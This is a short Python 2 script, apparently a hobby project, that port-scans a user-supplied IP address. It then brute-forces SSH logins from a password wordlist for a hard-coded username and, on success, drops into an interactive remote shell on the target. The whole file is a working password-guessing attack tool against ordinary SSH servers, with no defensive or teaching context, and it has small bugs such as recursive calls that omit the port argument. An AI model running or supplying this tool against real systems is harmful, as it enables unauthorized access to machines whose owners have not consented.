import PortScan
import PasswordGuessing
from pexpect import pxssh
import argparse
import time

ip=raw_input("ip Adress  Destination: ")

y = PortScan
x = y.PortScanning
x.scan(ip)
def connect(host, user, password, port):              #take the host of the user and tring toconnect
    global Found
    Fails = 0

    try:
        s = pxssh.pxssh()                       
        s.login(host, user, password, port)           #session
        print 'Password Found: ' + password    #each time prints the passward tried to acceses 
        return s

    except Exception, e:
        if Fails > 10000:
            print "brootforce tarminated unsuccsefully"
            exit(0)
        elif 'read_nonblocking' in str(e):
            Fails= Fails+ 1
            #time.sleep(3)
            return connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            #time.sleep(1)
            return connect(host, user, password,port)
        return None


def main(ip,user,passw,port):

    if ip and user and passw and port:
        with open(passw, 'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                print "Testing: " + str(password)
                con = connect(ip,user,password,port)
                if con:
                    print "SSH connected, PRESS  Q To EXIT"
                    command = raw_input(">")
                    while command != 'q'and command != 'Q':
                        con.sendline(command)
                        con.prompt()
                        print con.before
                        command = raw_input(">")
                else:
                		print "SSH NOT connected"
    else:
        #print parser.usage
        exit(0)
        
main(ip,"samsam","p.txt","22")
